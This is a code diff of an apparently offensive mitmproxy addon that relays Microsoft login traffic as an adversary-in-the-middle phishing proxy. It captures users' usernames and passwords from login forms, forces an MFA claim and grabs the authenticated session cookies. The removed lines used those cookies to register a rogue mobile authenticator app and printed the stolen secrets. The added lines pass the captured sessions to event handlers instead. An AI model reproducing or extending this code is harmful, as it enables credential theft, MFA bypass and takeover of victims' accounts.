@@ -10,9 +10,8 @@ from http.cookies import SimpleCookie
 
 from mitmproxy.http import HTTPFlow
 
-from .aitm_config import config
-from .helpers import cookies, requests, responses
-from .msft_aama import register_mobile_app
+from ..events import CredentialsCapturedEvent, EventEmitter, MfaSessionCapturedEvent
+from .utils import cookies, get_config, requests, responses
 
 logger = logging.getLogger(__name__)
 
@@ -39,7 +38,7 @@ class ModifierAddon:
             flow (mitmproxy.http.HTTPFlow): The HTTP flow object representing
                                             the client request and server response.
         """
-        if flow.request.host == config.local_upstream_hostname:
+        if flow.request.host == get_config().local_upstream_hostname:
             return
         requests.modify_header(flow, "Host")
         requests.modify_header(flow, "Referer")
@@ -48,7 +47,7 @@ class ModifierAddon:
         requests.modify_query(flow, "redirect_uri")
 
         if flow.request.path.startswith("/common/oauth2/v2.0/authorize"):
-            flow.request.query["claims"] = config.mfa_claim
+            flow.request.query["claims"] = get_config().mfa_claim
         if flow.request.path.startswith("/common/login"):
             self.credentials["login"] = flow.request.urlencoded_form["login"]
             self.credentials["passwd"] = flow.request.urlencoded_form["passwd"]
@@ -73,13 +72,7 @@ class ModifierAddon:
         responses.modify_cookies(flow)
         responses.modify_content(flow)
 
-        if flow.request.path in config.auth_url and flow.request.host != config.local_upstream_hostname:
-            parsed_cookies = cookies.parse_cookies(self.simple_cookie)
-            try:
-                secret_key = register_mobile_app(parsed_cookies, flow.request.headers["User-Agent"])
-                print(secret_key)
-            except AssertionError:
-                pass
-
-            print(json.dumps(parsed_cookies))
-            print(self.credentials)
+        if flow.request.path in get_config().auth_url and flow.request.host != get_config().local_upstream_hostname:
+            self.event_emitter.notify(
+                MfaSessionCapturedEvent(cookies.parse_cookies(self.simple_cookie), flow.request.headers["User-Agent"])
+            )
